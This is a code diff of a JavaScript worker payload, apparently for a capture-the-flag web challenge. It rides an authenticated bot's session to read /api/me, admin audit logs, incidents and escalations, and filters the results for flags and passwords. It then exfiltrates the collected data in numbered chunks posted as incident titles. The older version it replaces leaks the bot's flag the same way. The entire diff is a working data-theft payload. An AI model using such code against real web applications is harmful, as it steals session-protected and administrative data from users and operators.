@@ -1,38 +1,164 @@
+
 (async () => {
-    const data = await fetch('/api/me', {
-        credentials: 'same-origin'
-    }).then(r => r.json());
+    const ORIGIN = self.location.origin;
 
-    const u = data.user;
-    const flag = u.flag;
+    self.postMessage({
+        type: "progress",
+        message: "BOTLOG: Starting authenticated session inspection"
+    });
 
-    if (!flag) return;
+    async function get(path) {
+        try {
+            const response = await fetch(
+                new URL(path, ORIGIN).href,
+                {
+                    credentials: "include",
+                    cache: "no-store"
+                }
+            );
 
-    const send = async title => {
-        return fetch('/api/incidents', {
-            method: 'POST',
-            credentials: 'same-origin',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                title,
-                facility: 'Meridian-2',
-                severity: 'Watch'
-            })
-        }).then(r => r.json());
+            const raw = await response.text();
+
+            let body;
+            try {
+                body = JSON.parse(raw);
+            } catch {
+                body = raw;
+            }
+
+            return {
+                status: response.status,
+                body
+            };
+        } catch (e) {
+            return { error: String(e) };
+        }
+    }
+
+    const report = {
+        timestamp: new Date().toISOString(),
+        endpoints: {}
     };
 
-    await send(`DEVCTX:${u.role}:${u.email}:LEN:${flag.length}`);
+    // Current authenticated bot identity
+    report.endpoints.me = await get("/api/me");
 
-    for (let i = 0; i < flag.length; i += 12) {
-        const part = String(i / 12 + 1).padStart(2, '0');
+    // Audit records
+    report.endpoints.audit = await get(
+        "/api/admin/audit?limit=25"
+    );
 
-        await send(
-            `DEVFLAGPART-${part}: ${flag.slice(i, i + 12)}`
+    // Incident records
+    report.endpoints.incidents = await get("/api/incidents");
+
+    // Escalation records
+    report.endpoints.escalations = await get("/api/escalations");
+
+    self.postMessage({
+        type: "progress",
+        message: "BOTLOG: Initial records collected"
+    });
+
+    // Retrieve individual audit entry details
+    const auditBody = report.endpoints.audit.body;
+    const entries = auditBody?.entries || [];
+
+    report.auditDetails = [];
+
+    for (const entry of entries.slice(0, 20)) {
+        const detail = await get(
+            "/api/admin/audit?log=" +
+            encodeURIComponent(entry.id)
         );
+
+        report.auditDetails.push({
+            id: entry.id,
+            detail
+        });
+    }
+
+    // Extract useful incident information
+    const incidentBody = report.endpoints.incidents.body;
+
+    if (incidentBody?.incidents) {
+        report.incidentHighlights =
+            incidentBody.incidents
+                .filter(i =>
+                    /BOT|CyCTF|flag|password|developer|PWN/i.test(
+                        i.title || ""
+                    )
+                )
+                .map(i => ({
+                    id: i.id,
+                    code: i.code,
+                    title: i.title,
+                    created_by: i.created_by
+                }));
+    }
+
+    // Serialize report
+    const serialized = JSON.stringify(report);
+
+    const chunkSize = 70;
+    const total = Math.ceil(serialized.length / chunkSize);
+
+    self.postMessage({
+        type: "progress",
+        message: `BOTLOG: Sending ${total} chunks`
+    });
+
+    // Send results through incident titles
+    for (let i = 0; i < total; i++) {
+        const chunk = serialized.slice(
+            i * chunkSize,
+            (i + 1) * chunkSize
+        );
+
+        const title =
+            `BOTLOG-${String(i + 1).padStart(3, "0")}:${chunk}`;
+
+        const response = await fetch(
+            new URL("/api/incidents", ORIGIN).href,
+            {
+                method: "POST",
+                credentials: "include",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    title,
+                    facility: "Meridian-2",
+                    severity: "Watch"
+                })
+            }
+        );
+
+        const result = await response.json();
+
+        if (!response.ok || result.ok === false) {
+            throw new Error(
+                `Chunk ${i + 1} failed: ${JSON.stringify(result)}`
+            );
+        }
+
+        if ((i + 1) % 5 === 0) {
+            self.postMessage({
+                type: "progress",
+                message: `BOTLOG: Uploaded ${i + 1}/${total}`
+            });
+        }
+
+        await new Promise(resolve => setTimeout(resolve, 100));
     }
 
     self.postMessage({
-        type: 'progress',
-        message: 'DEVELOPER_FLAG_EXTRACTION_COMPLETE'
+        type: "progress",
+        message: `BOTLOG_UPLOAD_COMPLETE:${total}`
     });
-})();
+
+})().catch(error => {
+    self.postMessage({
+        type: "progress",
+        message: "BOTLOG_ERROR: " + String(error)
+    });
+});
